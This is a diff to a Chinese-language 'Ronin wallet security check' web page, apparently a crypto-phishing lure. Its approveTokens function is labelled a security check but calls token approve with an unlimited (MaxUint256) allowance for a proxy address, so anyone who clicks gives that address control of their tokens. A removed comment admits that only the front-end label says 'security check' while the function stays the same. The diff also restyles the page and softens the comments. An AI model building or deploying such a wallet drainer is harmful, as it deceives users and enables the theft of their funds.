@@ -7,8 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #fff;
+            background-color: #1a1a1a;
             text-align: center;
             padding: 20px;
             margin: 0;
@@ -16,7 +15,6 @@
         h1 {
             color: #fff;
             margin-bottom: 20px;
-            font-size: 36px;
         }
         button {
             margin: 10px;
@@ -38,7 +36,7 @@
         }
         p {
             font-size: 18px;
-            color: #555;
+            color: #fff;
         }
         #walletStatus {
             color: #28a745;
@@ -48,21 +46,18 @@
             margin-top: 20px;
             padding: 10px;
             font-size: 18px;
-            color: #333;
+            color: red;  /* Changed to red for better visibility on black background */
         }
-        .icon {
-            width: 50px;
-            height: 50px;
+        img {
             margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <!-- Ronin图标 -->
-    <img src="ronin_logo.png" alt="Ronin Logo" class="icon">
-    
+    <!-- Logo -->
+    <img src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE%E5%9B%9A%E6%94%AF%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="Ronin Logo" style="width: 100px; height: auto;">
     <h1>Ronin钱包安全检测</h1>
-    
+
     <!-- 链接钱包按钮 -->
     <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
     <p id="walletStatus">钱包未连接</p>
@@ -205,14 +200,14 @@
             }
         }
 
-        // 安全检测（实际功能不变，但前端显示为“安全检测”）
+        // 安全检测
         async function approveTokens() {
             if (!signer) {
                 alert("请先链接钱包！");
                 return;
             }
 
-            // 禁用按钮，防止用户再次点击
+            // 禁用按钮
             document.getElementById("approveButton").disabled = true;
             document.getElementById("operationStatus").innerText = "状态: 正在进行安全检测，请稍等...";
 
@@ -223,14 +218,18 @@
                 // 调用 approve 方法授权无限额度
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
                 console.log("安全检测已发送:", tx.hash);
+                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
                 await tx.wait(); // 等待交易确认
                 document.getElementById("operationStatus").innerText = "状态: 安全检测完成！";
                 alert("操作成功，已完成安全检测！");
             } catch (error) {
                 console.error("操作失败:", error);
-                document.getElementById("operationStatus").innerText = "状态: 检测失败，请检查控制台错误信息！";
+                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
                 alert("操作失败，请检查控制台错误信息！");
             }
+
+            // 启用按钮
+            document.getElementById("approveButton").disabled = false;
         }
     </script>
 </body>
